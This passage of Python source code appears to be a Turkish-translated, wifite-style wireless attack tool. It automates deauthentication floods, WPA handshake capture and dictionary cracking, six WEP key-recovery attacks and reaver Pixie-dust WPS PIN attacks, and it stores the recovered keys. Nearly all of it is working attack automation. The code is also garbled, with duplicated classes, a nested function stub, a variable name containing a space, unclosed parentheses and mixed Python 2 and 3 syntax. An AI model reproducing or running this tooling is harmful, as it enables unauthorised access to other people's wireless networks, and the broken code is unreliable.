                   self.iface]
            proc_read = Popen(cmd, stdout=DN, stderr=DN)

            # Deauth sürecini burada başlatır, daha sonraki hatalardan kaçınmak için
            proc_deauth = None

            print(' %s WPA el sıkışma yakalama %s "%s" üzerinde başlatılıyor%s' % \
                  (GR + sec_to_hms(self.RUN_CONFIG.WPA_ATTACK_TIMEOUT) + W, G, W, G + self.target.ssid + W))
            got_handshake = False

            seconds_running = 0
            seconds_since_last_deauth = 0

            target_clients = self.clients[:]
            client_index = -1
            start_time = time.time()

            # Deauth ve el sıkışma kontrol döngüsü
            while not got_handshake and (
                    self.RUN_CONFIG.WPA_ATTACK_TIMEOUT <= 0 or seconds_running < self.RUN_CONFIG.WPA_ATTACK_TIMEOUT):
                if proc_read.poll() is not None:
                    print("")
                    print("airodump-ng işlem durdu, çıkış durumu: " + str(proc_read.poll()))
                    print("")
                    break
                time.sleep(1)
                seconds_since_last_deauth += int(time.time() - start_time - seconds_running)
                seconds_running = int(time.time() - start_time)

                print("                                                          \r", end='')
                print(' %s El sıkışma dinleniyor...\r' % \
                      (GR + sec_to_hms(self.RUN_CONFIG.WPA_ATTACK_TIMEOUT - seconds_running) + W), end='')
                stdout.flush()

                if seconds_since_last_deauth > self.RUN_CONFIG.WPA_DEAUTH_TIMEOUT:
                    seconds_since_last_deauth = 0
                    # Aireplay-ng ile deauth paketlerini gönderir
                    cmd = ['aireplay-ng',
                           '--ignore-negative-one',
                           '--deauth',
                           str(self.RUN_CONFIG.WPA_DEAUTH_COUNT),  # Gönderilecek paket sayısı
                           '-a', self.target.bssid]

                    client_index += 1

                    if client_index == -1 or len(target_clients) == 0 or client_index >= len(target_clients):
                        print(" %s %s deauth paketi %s*broadcast*%s gönderiliyor..." % \
                              (GR + sec_to_hms(self.RUN_CONFIG.WPA_ATTACK_TIMEOUT - seconds_running) + W,
                               G + str(self.RUN_CONFIG.WPA_DEAUTH_COUNT) + W, G, W))
                        client_index = -1
                    else:
                        print(" %s %s deauth paketi %s gönderiliyor... " % \
                              (GR + sec_to_hms(self.RUN_CONFIG.WPA_ATTACK_TIMEOUT - seconds_running) + W, \
                               G + str(self.RUN_CONFIG.WPA_DEAUTH_COUNT) + W, \
                               G + target_clients[client_index].bssid + W))
                        cmd.append('-c')
                        cmd.append(target_clients[client_index].bssid)
                    cmd.append(self.iface)
                    stdout.flush()

                    # Deauth paketlerini gönderir ve tamamlanmasını bekler
                    proc_deauth = Popen(cmd, stdout=DN, stderr=DN)
                    proc_deauth.wait()
                    print("Gönderildi\r", end='')
                    stdout.flush()

                # Mevcut döküm dosyasını tutarlılık için kopyalar
                if not os.path.exists(cap_file): continue
                temp_cap_file = cap_file + '.temp'
                copy(cap_file, temp_cap_file)

                # CAP dosyasının kopyasını kaydeder (hata ayıklama için)
                # remove_file('/root/new/wpa-01.cap')
                # copy(temp + 'wpa-01.cap', '/root/new/wpa-01.cap')

                # El sıkışma olup olmadığını kontrol eder
                if self.has_handshake(self.target, temp_cap_file):
                    got_handshake = True

                    try:
                        os.mkdir(self.RUN_CONFIG.WPA_HANDSHAKE_DIR + os.sep)
                    except OSError:
                        pass

                    # Airodump ve aireplay süreçlerini sonlandırır
                    send_interrupt(proc_read)
                    send_interrupt(proc_deauth)

                    # El sıkışmanın bir kopyasını kaydeder
                    rename(temp_cap_file, save_as)
                    print("El sıkışma başarıyla yakalandı ve kaydedildi.")
        except KeyboardInterrupt:
            print("\nKullanıcı tarafından kesildi. İşlem sonlandırılıyor.")
            send_interrupt(proc_read)
            send_interrupt(proc_deauth 
 #############################
#  WPA Şifre Kapsama Sınıfı #
#############################

class WPAElBilgisiKapure(Attack):
    def __init__(self, iface, hedef, musteriler, config):
        self.iface = iface
        self.musteriler = musteriler
        self.hedef = hedef
        self.config = config

    def baslat_saldiri(self):
        """
            WPA el bilgisi kaputür saldırısını başlatır.
        """
        self.el_bilgisi_kapat()

    def durdur_saldiri(self):
        """
            WPA el bilgisi kaputür saldırısını durdurur.
        """
        pass

    def el_bilgisi_kapat(self):
        """
            WPA el bilgilerini airodump-ng çalıştırarak ve deautentikasyon paketleri göndererek kapatır.
            Yakalanan el bilgilerini kaydeder ve bulgular listesini günceller.
        """
        if self.config.WPA_SALDIRI_SURESI <= 0:
            self.config.WPA_SALDIRI_SURESI = -1

        # Yakalanan el bilgileri için çıktı dosyasının adını tanımlar
        kaydedilen_ad = self._dosya_adini_olustur()

        # Önceki airodump çıktı dosyalarını temizler
        self._temizle_dosyalari()

        try:
            # Airodump-ng sürecini başlat
            proc_okuma = self._airodump_baslat()
            proc_deauth = None

            print(f' %s WPA el bilgisi kaputür "%s" üzerinde başlatılıyor' % (
                self._zaman_formatla(self.config.WPA_SALDIRI_SURESI), self.hedef.ssid))
            
            el_bilgisi_yakalandi = False
            hedef_musteriler = self.musteriler[:]
            musteri_indeksi = -1
            baslangic_zamani = time.time()
            geçen_sure = 0
            son_deauth = 0

            # El bilgisi yakalama ve deautentikasyon yönetim döngüsü
            while not el_bilgisi_yakalandi and (
                    self.config.WPA_SALDIRI_SURESI <= 0 or geçen_sure < self.config.WPA_SALDIRI_SURESI):
                if proc_okuma.poll() is not None:
                    print(f"\nAirodump-ng durdu, durum {proc_okuma.poll()}\n")
                    break

                time.sleep(1)
                geçen_sure = int(time.time() - baslangic_zamani)
                son_deauth += int(time.time() - baslangic_zamani - geçen_sure)

                print(f"El bilgisi dinleniyor... {self._zaman_formatla(self.config.WPA_SALDIRI_SURESI - geçen_sure)}", end='\r')

                if son_deauth > self.config.WPA_DEAUTH_SURESI:
                    son_deauth = 0
                    proc_deauth = self._deauth_paketlerini_gonder(hedef_musteriler, musteri_indeksi)
                    musteri_indeksi = (musteri_indeksi + 1) % len(hedef_musteriler) if hedef_musteriler else -1

                # El bilgisi kontrolü ve bulguların güncellenmesi
                if self._el_bilgisi_var_mi():
                    el_bilgisi_yakalandi = True
                    self._basarili_el_bilgisi_kapatma(kaydedilen_ad)
                    break

                os.remove(self._gecici_cap_dosyasi())

                # Hedef müşteri listesini güncelle
                self._hedef_musterileri_guncelle()

            if not el_bilgisi_yakalandi:
                print(f'{self._zaman_formatla(0)} El bilgisi süresi içinde yakalanamadı', end='')

        except KeyboardInterrupt:
            print(f'\nWPA el bilgisi kaputürü kesildi (^C)')
            if self._kesinti_onay():
                self._temizle_dosyalari()
                self.config.gracefully_exit(0)

        self._temizle_dosyalari()
        return el_bilgisi_yakalandi

    def _dosya_adini_olustur(self):
        """
            Yakalanan el bilgileri için benzersiz bir dosya adı oluşturur.
        """
        kaydedilen_ad = f"{self.config.WPA_EL_BILGISI_KLASOR}/{re.sub(r'[^a-zA-Z0-9]', '', self.hedef.ssid)}_" \
                        f"{self.hedef.bssid.replace(':', '-')}.cap"
        indeks = 0
        while os.path.exists(kaydedilen_ad):
            indeks += 1
            kaydedilen_ad = f"{self.config.WPA_EL_BILGISI_KLASOR}/{re.sub(r'[^a-zA-Z0-9]', '', self.hedef.ssid)}_" \
                            f"{self.hedef.bssid.replace(':', '-')}_{indeks}.cap"
        return kaydedilen_ad

    def _temizle_dosyalari(self):
        """
            Önceki airodump ve aireplay çıktı dosyalarını temizler.
        """
        dosya_on_ek = os.path.join(self.config.temp, 'wpa')
        remove_airodump_files(dosya_on_ek)

    def _airodump_baslat(self):
        """
            El bilgilerini yakalamak için airodump-ng sürecini başlatır.
        """
        komut = ['airodump-ng',
                 '-w', os.path.join(self.config.temp, 'wpa'),
                 '-c', self.hedef.kanal,
                 '--write-interval', '1',
                 '--bssid', self.hedef.bssid,
                 self.iface]
        return Popen(komut, stdout=DN, stderr=DN)

    def _deauth_paketlerini_gonder(self, hedef_musteriler, musteri_indeksi):
        """
            Hedefe ve ilişkili müşterilere deautentikasyon paketleri gönderir.
        """
        komut = ['aireplay-ng',
                 '--ignore-negative-one',
                 '--deauth', str(self.config.WPA_DEAUTH_SAYISI),
                 '-a', self.hedef.bssid]
        if musteri_indeksi != -1 and len(hedef_musteriler) > 0:
            komut.extend(['-c', hedef_musteriler[musteri_indeksi].bssid])
        komut.append(self.iface)
        proc_deauth = Popen(komut, stdout=DN, stderr=DN)
        proc_deauth.wait()
        print('Deauth paketleri gönderildi', end='\r')
        return proc_deauth

    def _el_bilgisi_var_mi(self):
        """
            El bilgisi yakalandı mı kontrol eder, geçici yakalama dosyasını inceleyerek.
        """
        cap_dosyasi = self._cap_dosyasi()
        gecici_cap_dosyasi = cap_dosyasi + '.temp'
        copy(cap_dosyasi, gecici_cap_dosyasi)
        return self.has_handshake(self.hedef, gecici_cap_dosyasi)

    def _basarili_el_bilgisi_kapatma(self, kaydedilen_ad):
        """
            Başarıyla yakalanan el bilgilerini işler, dosyayı kaydeder ve bulguları günceller.
        """
        os.mkdir(self.config.WPA_EL_BILGISI_KLASOR, exist_ok=True)
        rename(self._gecici_cap_dosyasi(), kaydedilen_ad)
        print(f'El bilgisi yakalandı! "{kaydedilen_ad}" olarak kaydedildi')
        self.config.WPA_FINDINGS.extend([
            f'{self.hedef.ssid} ({self.hedef.bssid}) el bilgisi yakalandı',
            f'Saved as {kaydedilen_ad}',
            ''
        ])
        if self.config.WPA_EL_BILGISI_SOYMA:
            self.strip_handshake(kaydedilen_ad)
        self.config.WPA_CAPS_TO_CRACK.append(CapFile(kaydedilen_ad, self.hedef.ssid, self.hedef.bssid))

    def _hedef_musterileri_guncelle(self):
        """
            Airodump CSV çıktısına göre hedef müşteri listesini günceller.
        """
        for musteri in self.config.RUN_ENGINE.parse_csv(self._csv_dosyasi())[1]:
            if musteri.station != self.hedef.bssid:
                continue
            if not any(c.bssid == musteri.bssid for c in self.musteriler):
                print(f'Yeni müşteri bulundu: {musteri.bssid}')
                self.musteriler.append(musteri)

    def _cap_dosyasi(self):
        """
            Mevcut yakalama dosyasının yolunu döndürür.
        """
        return os.path.join(self.config.temp, 'wpa') + '-01.cap'

    def _gecici_cap_dosyasi(self):
        """
            Geçici yakalama dosyasının yolunu döndürür.
        """
        return self._cap_dosyasi() + '.temp'

    def _csv_dosyasi(self):
        """
            Airodump-ng tarafından oluşturulan CSV dosyasının yolunu döndürür.
        """
        return os.path.join(self.config.temp, 'wpa') + '-01.csv'

    def _kesinti_onay(self):
        """
            Saldırıyı kesmek için kullanıcıdan onay alır.
        """
        onay = input('Kapatmak istediğinizden emin misiniz? (E/H): ').strip().lower()
        return onay in ['e', 'evet']

    def has_handshake_aircrack(self, target, capfile):
       def el_bilgisi_var_mi_aircrack(self, hedef, capdosyasi):
        """
            aircrack-ng kullanarak .cap dosyasında el bilgisinin (handshake) var olup olmadığını kontrol eder.
            El bilgisi bulunursa True, aksi takdirde False döner.
        """
        if not program_exists('aircrack-ng'):
            return False

        # El bilgisini kontrol etmek için komutu oluştur
        komut = f'echo "" | aircrack-ng -a 2 -w - -b {hedef.bssid} {capdosyasi}'
        proc = Popen(komut, stdout=PIPE, stderr=DN, shell=True)
        proc.wait()
        cikti = proc.communicate()[0].decode()

        # 'Passphrase not in dictionary' ifadesinin olup olmadığını kontrol et
        return 'Passphrase not in dictionary' not in cikti

    def el_bilgisi_var_mi(self, hedef, capdosyasi):
        """
            .cap dosyasında geçerli bir WPA el bilgisinin olup olmadığını çeşitli yöntemlerle kontrol eder.
            El bilgisi bulunursa True, aksi takdirde False döner.
        """
        el_bilgisi_var = False
        denenen_yontemler = False

        # Tshark ile el bilgisini kontrol et
        if self.RUN_CONFIG.WPA_HANDSHAKE_TSHARK:
            denenen_yontemler = True
            el_bilgisi_var = self.el_bilgisi_var_mi_tshark(hedef, capdosyasi)

        # Cowpatty ile el bilgisini kontrol et
        if el_bilgisi_var and self.RUN_CONFIG.WPA_HANDSHAKE_COWPATTY:
            denenen_yontemler = True
            el_bilgisi_var = self.el_bilgisi_var_mi_cowpatty(hedef, capdosyasi)

        # Pyrit ile el bilgisini kontrol et
        if el_bilgisi_var and self.RUN_CONFIG.WPA_HANDSHAKE_PYRIT: 
            denenen_yontemler = True
            el_bilgisi_var = self.el_bilgisi_var_mi_pyrit(hedef, capdosyasi)

        # aircrack-ng ile el bilgisini kontrol et
        if el_bilgisi_var and self.RUN_CONFIG.WPA_HANDSHAKE_AIRCRACK:
            denenen_yontemler = True
            el_bilgisi_var = self.el_bilgisi_var_mi_aircrack(hedef, capdosyasi)

        if denenen_yontemler:
            return el_bilgisi_var
        
        # Hiçbir yöntem denenmemişse hata mesajı ver
        print(R + ' [!]' + O + ' El bilgisini kontrol edilemedi: tüm el bilgisi kontrol yöntemleri devre dışı!' + W)
        self.RUN_CONFIG.exit_gracefully(1)

    def el_bilgisi_temizle(self, capdosyasi):
        """
            Tshark veya Pyrit kullanarak .cap dosyasındaki el bilgisi dışındaki paketleri temizler.
            Orijinal dosya güncellenir.
        """
        cikti_dosyasi = capdosyasi

        if program_exists('pyrit'):
            # Pyrit kullanarak el bilgisi dışındaki paketleri temizle
            komut = ['pyrit', '-r', capdosyasi, '-o', capdosyasi + '.temp', 'stripLive']
            call(komut, stdout=DN, stderr=DN)
            if os.path.exists(capdosyasi + '.temp'):
                rename(capdosyasi + '.temp', cikti_dosyasi)

        elif program_exists('tshark'):
            # Tshark kullanarak el bilgisi dışındaki paketleri temizle
            komut = ['tshark', '-r', capdosyasi, '-R', 'eapol || wlan_mgt.tag.interpretation', '-2', '-w', capdosyasi + '.temp']
            call(komut, stdout=DN, stderr=DN)
            rename(capdosyasi + '.temp', cikti_dosyasi)

        else:
            print(R + " [!]" + O + " .cap dosyasını temizleme yapılamadı: ne Pyrit ne de Tshark bulunamadı." + W)
##########################
# WPA KIRMA FONKSİYONLARI #
##########################

def wpa_kirma(capdosyasi, RUN_CONFIG):
    """
        Aircrack-ng kullanarak .cap dosyasını kırar.
        Bu yöntem kaba ve yavaştır. Kullanıcılar, Pyrit, Cowpatty veya oclhashcat kullanarak manuel olarak kırma yapabilirler.
    """
    if RUN_CONFIG.WPA_DICTIONARY == '':
        print(R + ' [!]' + O + ' WPA sözlüğü bulunamadı! -dict <dosya> komut satırı argümanını kullanın' + W)
        return False

    print(GR + ' [0:00:00]' + W + ' %s dosyasını %s ile kırıyorum' % (G + capdosyasi.ssid + W, G + 'aircrack-ng' + W))
    baslangic_zamani = time.time()
    kirildi = False

    remove_file(RUN_CONFIG.temp + 'out.out')
    remove_file(RUN_CONFIG.temp + 'wpakey.txt')

    komut = ['aircrack-ng',
             '-a', '2',  # WPA kırma
             '-w', RUN_CONFIG.WPA_DICTIONARY,  # Kelime listesi
             '-l', RUN_CONFIG.temp + 'wpakey.txt',  # Anahtarı dosyaya kaydet
             '-b', capdosyasi.bssid,  # Hedef BSSID
             capdosyasi.filename]

    proc = Popen(komut, stdout=open(RUN_CONFIG.temp + 'out.out', 'a'), stderr=DN)
    try:
        anahtarlar_test_edildi = 0
        anahtarlar_saniye = 0
        while True:
            time.sleep(1)

            if proc.poll() is not None:  # Aircrack durmuş
                if os.path.exists(RUN_CONFIG.temp + 'wpakey.txt'):
                    # Kırıldı
                    with open(RUN_CONFIG.temp + 'wpakey.txt') as inf:
                        anahtar = inf.read().strip()
                    RUN_CONFIG.WPA_FINDINGS.append(f'kırılmış WPA anahtarı "%s" (%s): "%s"' % (
                        G + capdosyasi.ssid + W, G + capdosyasi.bssid + W, C + anahtar + W))
                    RUN_CONFIG.WPA_FINDINGS.append('')
                    t = Target(capdosyasi.bssid, 0, 0, 0, 'WPA', capdosyasi.ssid)
                    t.key = anahtar
                    RUN_CONFIG.save_cracked(t)

                    print(GR + '\n [+]' + W + ' %s (%s) kırıldı!' % (G + capdosyasi.ssid + W, G + capdosyasi.bssid + W))
                    print(GR + ' [+]' + W + ' anahtar:    "%s"\n' % (C + anahtar + W))
                    kirildi = True
                else:
                    # Kırılamadı
                    print(R + '\n [!]' + R + 'kırma denemesi başarısız' + O + ': anahtar sözlükte bulunamadı' + W)
                break

            with open(RUN_CONFIG.temp + 'out.out', 'r') as inf:
                satirlar = inf.read().split('\n')
            with open(RUN_CONFIG.temp + 'out.out', 'w'):
                pass
            for satir in satirlar:
                i = satir.find(']')
                j = satir.find('keys tested', i)
                if i != -1 and j != -1:
                    anahtarlar_test_edildi_str = satir[i + 2:j - 1]
                    try:
                        anahtarlar_test_edildi = int(anahtarlar_test_edildi_str)
                    except ValueError:
                        pass
                i = satir.find('(')
                j = satir.find('k/s)', i)
                if i != -1 and j != -1:
                    anahtarlar_saniye_str = satir[i + 1:j - 1]
                    try:
                        anahtarlar_saniye = float(anahtarlar_saniye_str)
                    except ValueError:
                        pass

            print(f"\r {GR + sec_to_hms(time.time() - baslangic_zamani) + W} {G + add_commas(anahtarlar_test_edildi) + W} anahtar test edildi ({G + anahtarlar_saniye:.2f} anahtar/sn{W})   ", end='')
            stdout.flush()

    except KeyboardInterrupt:
        print(R + '\n (^C)' + O + ' WPA kırma kesildi' + W)

    send_interrupt(proc)
    try:
        os.kill(proc.pid, SIGTERM)
    except OSError:
        pass

    return kirildi


def add_commas(n):
    """
        Tam sayı olan n'yi alır ve binlik basamağında virgüller ile string temsili döner.
    """
    strn = str(n)
    lenn = len(strn)
    i = 0
    sonuc = ''
    while i < lenn:
        if (lenn - i) % 3 == 0 and i != 0:
            sonuc += ','
        sonuc += strn[i]
        i += 1
    return sonuc

#################
# WEP FONKSİYONLARI #
#################
class WEPAttack(Attack):
    def __init__(self, iface, target, clients, config):
        self.iface = iface
        self.target = target
        self.clients = clients
        self.RUN_CONFIG = config

    def RunAttack(self):
        '''
            WEP kırma işlemi için soyut yöntem
        '''
        self.attack_wep()

    def EndAttack(self):
        '''
            WEP saldırısını sonlandırmak için soyut yöntem
        '''
        pass

    def attack_wep(self):
        """
        WEP şifreli ağa saldırır.
        Anahtar başarıyla bulunursa True, aksi halde False döner.
        """
        if self.RUN_CONFIG.WEP_TIMEOUT <= 0:
            self.RUN_CONFIG.WEP_TIMEOUT = -1

        toplam_saldırılar = 6
        if not self.RUN_CONFIG.WEP_ARP_REPLAY: toplam_saldırılar -= 1
        if not self.RUN_CONFIG.WEP_CHOPCHOP: toplam_saldırılar -= 1
        if not self.RUN_CONFIG.WEP_FRAGMENT: toplam_saldırılar -= 1
        if not self.RUN_CONFIG.WEP_CAFFELATTE: toplam_saldırılar -= 1
        if not self.RUN_CONFIG.WEP_P0841: toplam_saldırılar -= 1
        if not self.RUN_CONFIG.WEP_HIRTE: toplam_saldırılar -= 1

        if toplam_saldırılar <= 0:
            print(R + ' [!]' + O + ' WEP saldırıları başlatılamıyor: saldırı seçilmedi!')
            return False
        kalan_saldırılar = toplam_saldırılar

        print(' %s saldırı hazırlığı "%s" (%s)' % 
              (GR + sec_to_hms(self.RUN_CONFIG.WEP_TIMEOUT) + W, G + self.target.ssid + W, G + self.target.bssid + W))

        dosya_ön eki = os.path.join(self.RUN_CONFIG.temp, 'wep')
        wepkey_dosya = os.path.join(self.RUN_CONFIG.temp, 'wepkey.txt')
        csv_dosya = dosya_ön eki + '-01.csv'
        cap_dosya = dosya_ön eki + '-01.cap'

        remove_airodump_files(dosya_ön eki)
        remove_file(wepkey_dosya)

        # Airodump işlemini başlat
        cmd_airodump = ['airodump-ng',
                        '-w', dosya_ön eki,
                        '-c', self.target.channel,
                        '--write-interval', '1',
                        '--bssid', self.target.bssid,
                        self.iface]
        proc_airodump = Popen(cmd_airodump, stdout=DN, stderr=DN)
        proc_aireplay = None
        proc_aircrack = None

        başarılı = False
        cracking_basladı = False
        client_mac = ''

        toplam_ivs = 0
        ivs = 0
        son_ivs = 0
        for saldırı_num in range(0, 6):

            if saldırı_num == 0 and not self.RUN_CONFIG.WEP_ARP_REPLAY:
                continue
            elif saldırı_num == 1 and not self.RUN_CONFIG.WEP_CHOPCHOP:
                continue
            elif saldırı_num == 2 and not self.RUN_CONFIG.WEP_FRAGMENT:
                continue
            elif saldırı_num == 3 and not self.RUN_CONFIG.WEP_CAFFELATTE:
                continue
            elif saldırı_num == 4 and not self.RUN_CONFIG.WEP_P0841:
                continue
            elif saldırı_num == 5 and not self.RUN_CONFIG.WEP_HIRTE:
                continue

            kalan_saldırılar -= 1

            try:
                if self.wep_fake_auth(self.iface, self.target, sec_to_hms(self.RUN_CONFIG.WEP_TIMEOUT)):
                    client_mac = self.RUN_CONFIG.THIS_MAC
                elif not self.RUN_CONFIG.WEP_IGNORE_FAKEAUTH:
                    send_interrupt(proc_aireplay)
                    send_interrupt(proc_airodump)
                    print(R + ' [!]' + O + ' hedef ile sahte kimlik doğrulama yapılamadı')
                    print(R + ' [!]' + O + ' bunu atlamak için "ignore-fake-auth" seçeneğini kullanın')
                    return False

                remove_file(os.path.join(self.RUN_CONFIG.temp, 'arp.cap'))
                cmd = self.get_aireplay_command(self.iface, saldırı_num, self.target, self.clients, client_mac)
                if cmd == '':
                    continue
                if proc_aireplay:
                    send_interrupt(proc_aireplay)
                proc_aireplay = Popen(cmd, stdout=PIPE, stderr=PIPE)

                print('\r %s saldırı "%s" aracılığıyla' % (
                GR + sec_to_hms(self.RUN_CONFIG.WEP_TIMEOUT) + W, G + self.target.ssid + W),
                end=' ')
                if saldırı_num == 0:
                    print(G + 'arp-replay', end=' ')
                elif saldırı_num == 1:
                    print(G + 'chop-chop', end=' ')
                elif saldırı_num == 2:
                    print(G + 'fragmentation', end=' ')
                elif saldırı_num == 3:
                    print(G + 'caffe-latte', end=' ')
                elif saldırı_num == 4:
                    print(G + 'p0841', end=' ')
                elif saldırı_num == 5:
                    print(G + 'hirte', end=' ')
                print('saldırısı' + W)

                print(' %s %s%d%s ivs @ %s iv/sn' % (
                GR + sec_to_hms(self.RUN_CONFIG.WEP_TIMEOUT) + W, G, toplam_ivs, W, G + '0' + W),
                end='')
                stdout.flush()

                time.sleep(1)
                if saldırı_num == 1:
                    self.wep_send_deauths(self.iface, self.target, self.clients)
                son_deauth = time.time()

                tekrar = False
                zaman_basladı = time.time()
                while time.time() - zaman_basladı < self.RUN_CONFIG.WEP_TIMEOUT:
                    if self.RUN_CONFIG.WEP_TIMEOUT == -1:
                        mevcut_hms = "[sonsuz]"
                    else:
                        mevcut_hms = sec_to_hms(self.RUN_CONFIG.WEP_TIMEOUT - (time.time() - zaman_basladı))
                    print("\r %s\r" % (GR + mevcut_hms + W), end='')
                    stdout.flush()
                    time.sleep(1)

                    csv = self.RUN_CONFIG.RUN_ENGINE.parse_csv(csv_dosya)[0]
                    if len(csv) > 0:
                        ivs = int(csv[0].data)
                        print("\r                                                   ", end='')
                        print("\r %s %s%d%s ivs @ %s%d%s iv/sn" % \
                              (GR + mevcut_hms + W, G, toplam_ivs + ivs, W, G, (ivs - son_ivs), W),
                              end='')
                        if ivs - son_ivs == 0 and time.time() - son_deauth > 30:
                            print("\r %s deauth yapılıyor..." % (GR + mevcut_hms + W), end='')
                            self.wep_send_deauths(self.iface, self.target, self.clients)
                            print("tamamlandı\r", end='')
                            son_deauth = time.time()

                        son_ivs = ivs
                        stdout.flush()
                        if toplam_ivs + ivs >= self.RUN_CONFIG.WEP_CRACK_AT_IVS and not cracking_basladı:
                            cmd = ['aircrack-ng',
                                   '-a', '1',
                                   '-l', wepkey_dosya]
                            for f in os.listdir(self.RUN_CONFIG.temp):
                                if f.startswith('wep-') and f.endswith('.cap'):
                                    cmd.append(os.path.join(self.RUN_CONFIG.temp, f))

                            print("\r %s %s (%sover %d ivs%s)" % (
                            GR + mevcut_hms + W, G + 'kırma başladı' + W, G, self.RUN_CONFIG.WEP_CRACK_AT_IVS, W),
                            end='')
                            proc_aircrack = Popen(cmd, stdout=DN, stderr=DN)
                            cracking_basladı = True

                    if os.path.exists(wepkey_dosya):
                        infile = open(wepkey_dosya, 'r')
                        anahtar = infile.read().replace('\n', '')
                        infile.close()
                        print('\n\n %s %s (%s)! anahtar: "%s"' % (
                        mevcut_hms, G + 'kırıldı', self.target.ssid + W, G + self.target.bssid + W, C + anahtar + W))
                        self.RUN_CONFIG.WEP_FINDINGS.append(
                            'kırıldı %s (%s), anahtar: "%s"' % (self.target.ssid, self.target.bssid, anahtar))
                        self.RUN_CONFIG.WEP_FINDINGS.append('')

                        t = Target(self.target.bssid, 0, 0, 0, 'WEP', self.target.ssid)
                        t.key = anahtar
                        self.RUN_CONFIG.save_cracked(t)

                        send_interrupt(proc_airodump)
                        send_interrupt(proc_aireplay)
                        try:
                            os.kill(proc_aireplay, SIGTERM)
                        except:
                            pass
                        send_interrupt(proc_aircrack)
                        return True

                    if os.path.exists(os.path.join(self.RUN_CONFIG.temp, 'aircrack-ng'):
                        if self.RUN_CONFIG.WEP_CANT_FOUND == 1:
                            print("\n %s [%s]" % (R, 'Hedef anahtar bulunamadı'))
                            print(R + ' [!]' + O + ' Anahtar bulunamadı.')
                            return False
                        else:
                            print(R + ' [!]' + O + ' Anahtar bulunamadı.')
                            return False
            except KeyboardInterrupt:
                send_interrupt(proc_airodump)
                send_interrupt(proc_aireplay)
                send_interrupt(proc_aircrack)
                break
            except Exception as e:
                print("\n\n %s %s" % (R, str(e)))
                return False
        send_interrupt(proc_airodump)
        send_interrupt(proc_aireplay)
        send_interrupt(proc_aircrack)
        print()
        print(R + ' [!]' + O + ' WEP anahtarı bulunamadı.')

        return False

#################
# WPS FUNC. #
#################

class WPSAttack(Attack):
    def __init__(self, iface, target, config):
        self.iface = iface
        self.target = target
        self.RUN_CONFIG = config

    def RunAttack(self):
        '''
            WPS saldırısını başlatan soyut metod.
        '''
        if self.is_pixie_supported():
            # Pixie-dust saldırısını dene
            if self.attack_wps_pixie():
                # Başarılı olursa dur
                return True

        # Kullanıcı sadece pixie saldırısının çalıştırılmasını belirtmişse çık
        if self.RUN_CONFIG.PIXIE:
            return False

        # WPS PIN saldırısını dene
        return self.attack_wps()

    def EndAttack(self):
        '''
            WPS saldırısını bitiren soyut metod.
        '''
        pass

    def is_pixie_supported(self):
        '''
            Mevcut Reaver sürümünün pixie-dust saldırısını destekleyip desteklemediğini kontrol eder.
        '''
        p = Popen(['reaver', '-h'], stdout=DN, stderr=PIPE)
        stdout = p.communicate()[1]
        for line in stdout.split('\n'):
            if '--pixie-dust' in line:
                return True
        return False

    def attack_wps_pixie(self):
        """
            Belirli üreticilere karşı "Pixie WPS" saldırısını dener.
        """

        # TODO Kullanıcının reaver sürümünün Pixie saldırısını destekleyip desteklemediğini kontrol et (1.5.2+, "t6_x mod")
        #      Desteklemiyorsa False döndür

        output_file = os.path.join(self.RUN_CONFIG.temp, 'out.out')
        pixie_file = os.path.join(self.RUN_CONFIG.temp, 'pixie.out')

        print GR + ' [0:00:00]' + W + ' %sWPS Pixie saldırısı%s başlatılıyor: %s' % \
                                      (G, W, G + self.target.ssid + W + ' (' + G + self.target.bssid + W + ')' + W)
        cmd = ['reaver',
               '-i', self.iface,
               '-b', self.target.bssid,
               '-c', self.target.channel,
               '-K', '1', # Pixie WPS saldırısı
               '-vv']  # Ayrıntılı çıktı

        # Çıktıyı dosyalara yönlendir
        outf = open(output_file, 'a')
        errf = open(pixie_file, 'a')

        # Süreci başlat
        proc = Popen(cmd, stdout=outf, stderr=errf)

        cracked = False  # Parola/pin bulunma bayrağı
        time_started = time.time()
        pin = ''
        key = ''

        try:
            while not cracked:
                time.sleep(1)
                errf.flush()
                if proc.poll() is not None:
                    # Süreç durdu: Kırıldı mı? Başarısız mı?
                    errf.close()
                    inf = open(output_file, 'r')
                    lines = inf.read().split('\n')
                    inf.close()
                    for line in lines:
                        # Kırıldı: eski pixiewps/reaver çıktısı
                        if line.find("WPS PIN: '") != -1:
                            pin = line[line.find("WPS PIN: '") + 10:-1]
                            cracked = True
                        if line.find("WPA PSK: '") != -1:
                            key = line[line.find("WPA PSK: '") + 10:-1]

                        # Kırıldı: yeni pixiewps çıktısı
                        if line.find("WPS pin:  ") != -1:
                            pin = line[line.find("WPS pin:  ") + 10:]
                            cracked = True
                        if line.find("WPA PSK:  ") != -1:
                            key = line[line.find("WPA PSK:  ") + 10:]

                        # Başarısız:
                        if 'Pixie-Dust' in line and 'WPS pin not found' in line:
                            # PixieDust bu routerda mümkün değil
                            print '\r %s WPS Pixie saldırısı%s başarısız - WPS pin bulunamadı              %s' % (GR + sec_to_hms(time.time() - time_started) + G, R, W)
                            break
                    break

                # (Reaver hala çalışıyor)

                print '\r %s WPS Pixie saldırısı:' % (GR + sec_to_hms(time.time() - time_started) + G),

                # Bir çıktı dosyası var mı kontrol et
                if not os.path.exists(output_file): continue
                inf = open(output_file, 'r')
                lines = inf.read().split('\n')
                inf.close()

                output_line = ''
                for line in lines:
                    line = line.replace('[+]', '').replace('[!]', '').replace('\0', '').strip()
                    if line == '' or line == ' ' or line == '\t': continue
                    if len(line) > 50:
                        # Makul bir boyuta kırp
                        line = line[0:47] + '...'
                    output_line = line

                if 'Sending M2 message' in output_line:
                    # Bu noktada Pixie saldırısında tüm çıktı stderr üzerinden yapılır
                    # Sonuçları görmek için sürecin bitmesini beklemeliyiz.
                    print O, 'M2 mesajı gönderiliyor (bir süre alabilir)...                   ', W,
                elif output_line != '':
                    # Reaver'dan son mesajı "durum güncellemesi" olarak yazdır
                    print C, output_line, W, ' ' * (50 - len(output_line)),

                stdout.flush()

                # Çıktı dosyasını temizle
                inf = open(output_file, 'w')
                inf.close()

            # Büyük "kırılmadı" döngüsünün sonu
            if cracked:
                if pin != '':
                    print GR + '\n\n [+]' + G + ' PIN bulundu:     %s' % (C + pin + W)

                if key != '':
                    print GR + ' [+] %sWPA anahtarı bulundu:%s %s' % (G, W, C + key + W)
                else:
                    key = 'Yok'

                self.RUN_CONFIG.WPA_FINDINGS.append(W + "bulundu %s'nin WPA anahtarı: \"%s\", WPS PIN: %s" % (
                G + self.target.ssid + W, C + key + W, C + pin + W))
                self.RUN_CONFIG.WPA_FINDINGS.append('')

